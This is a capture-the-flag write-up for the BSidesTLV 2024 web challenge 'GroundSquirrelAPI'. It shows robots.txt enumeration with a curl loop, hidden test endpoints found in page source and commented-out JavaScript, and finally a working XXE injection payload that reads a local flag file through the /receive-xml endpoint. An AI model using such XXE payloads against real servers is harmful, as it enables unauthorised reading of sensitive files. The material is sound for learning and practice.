# GroundSquirrelAPI

 * Category: Web
 * 200 Points
 * Solved by the JCTF Team

## Description

> Our team found a development website as part of the external attack surface engagement, but the website seems unavailable for us. 
> Try to find a way in any way and manipulate the application logic to get the flag.
> 
> No DDOS allowed

## Solution

The website itself indicates that it's under maintenance:

```console
┌──(user@kali)-[/media/sf_CTFs/bsides/GroundSquirrelAPI]
└─$ curl https://bstlv24-groundsquirrelapi.chals.io/
<br/><Br/<br/><center><h1>Under maintenance. Please try later.</h1></center>
```

Let's check `robots.txt`:

```console
┌──(user@kali)-[/media/sf_CTFs/bsides/GroundSquirrelAPI]
└─$ curl https://bstlv24-groundsquirrelapi.chals.io/robots.txt
User-agent: Googlebot
Disallow: /flag.txt
Disallow: /nogooglebot/
Disallow: /testeing
Disallow: /flag
Disallow: /blog-tst
Disallow: /flag-tst
Disallow: /raltime-tst
Disallow: /images
Disallow: /uploads
Disallow: /welcome-tst
Disallow: /D0notCheck
Disallow: /backups
Disallow: /download
Disallow: /bak
Disallow: /xmlapi
User-agent: *
Sitemap: sitemap.xml
```

A quick test to see which URLs are worth following:

```console
┌──(user@kali)-[/media/sf_CTFs/bsides/GroundSquirrelAPI]
└─$ curl -s https://bstlv24-groundsquirrelapi.chals.io/robots.txt | grep Disallow | awk '{ print $2 }' | while read -r address; do status_code=$(curl -o /dev/null -s -w "%{http_co
de}" "https://bstlv24-groundsquirrelapi.chals.io$address"); echo "Path: $address, Status Code: $status_code"; done
Path: /flag.txt, Status Code: 200
Path: /nogooglebot/, Status Code: 404
Path: /testeing, Status Code: 404
Path: /flag, Status Code: 404
Path: /blog-tst, Status Code: 404
Path: /flag-tst, Status Code: 404
Path: /raltime-tst, Status Code: 404
Path: /images, Status Code: 404
Path: /uploads, Status Code: 404
Path: /welcome-tst, Status Code: 200
Path: /D0notCheck, Status Code: 404
Path: /backups, Status Code: 404
Path: /download, Status Code: 404
Path: /bak, Status Code: 404
Path: /xmlapi, Status Code: 404
```

So we should check `flag.txt` and `/welcome-tst`. Here's `flag.txt`:

```console
┌──(user@kali)-[/media/sf_CTFs/bsides/GroundSquirrelAPI]
└─$ curl https://bstlv24-groundsquirrelapi.chals.io/flag.txt
Allowed only from localhost.
```

`/welcome-tst` looks like a landing page for an API service:

> Ground Squirrel API
> 
> Use our API to get updates about any blog you'd like!
> 
> (click on the button "Check Updates" for simulation)

Inspecting the sources, we find the following:

```html
      <!-- @todo: Remember to uncomment the line below for testing -->
      <!-- <a class="btn-getstarted" href="./uploadContent-tst">Check Updates</a>-->
      <a class="btn-getstarted" href="./uploadContent">Check Updates</a>
```

While `./uploadContent` is broken, `./uploadContent-tst` does seem to return some response, including:

```html
      <div class="container">
        <div class="row justify-content-center" data-aos="zoom-out">
          <div class="col-xl-7 col-lg-9 text-center">
            <h1>Ground Squirrel API Demo</h1>
            <p>Enter the payload for getting the results:<br/></p>
            <textarea cols="60" rows="15"></textarea>
            <br/><button name="updatePayload">CHECK UPDATES</button>
            <p>* Your are limit for 4 free requests.</p>
          </div>
        </div>
      </div>
```

The button itself does nothing, but when we inspect the Javascript code at `/assets/js/main.js` 
we find an interesting capability:

```javascript
/**
   * Detect Submitted Payload
   */
  const button = document.querySelector('button[name="updatePayload"]');

    // Add click event listener
    button.addEventListener('click', function(event) {
      // Handle the click event
      alert("Not Implemented.");
      /***
      // @todo: Need to fix the API into JSON instend of XML
      // Create a new XMLHttpRequest object
        var xhr = new XMLHttpRequest();
        // Configure the request
        xhr.open("POST", "./receive-xml", true);
        // Set the Content-Type header to specify that you're sending XML data
        xhr.setRequestHeader("Content-Type", "application/xml");
        // Set up a function to handle the response
        xhr.onreadystatechange = function() {
          if (xhr.readyState === XMLHttpRequest.DONE) {
            if (xhr.status === 200) {
              // Request was successful, handle the response
              console.log("Response:", xhr.responseText);
            } else {
              // Request failed
              console.error("Error:", xhr.status);
            }
          }
        };
        // Create the XML data to send
        var xmlData = '<?xml version="1.0" encoding="UTF-8"?><root><child>blogs.google.com</child></root>';
        // Send the request with the XML data
        xhr.send(xmlData);
         */
    });
```

Notice the commented-out section, which seems to be a draft for the production functionality.

We can send an XML structure and receive a response. The server might be vulnerable to 
[XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md),
let's try:

```console
┌──(user@kali)-[/media/sf_CTFs/bsides/GroundSquirrelAPI]
└─$ curl -X POST -H "Content-Type: application/xml" --data '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY test SYSTEM "flag.txt">]><root><child>&test;</child></ro
ot>' https://bstlv24-groundsquirrelapi.chals.io/receive-xml
{"status":"ok","payload":"<root><child>BSidesTLV2024{D0ntMassWithGoph3rStuff!}</child></root>"}
```

The flag: `BSidesTLV2024{D0ntMassWithGoph3rStuff!}`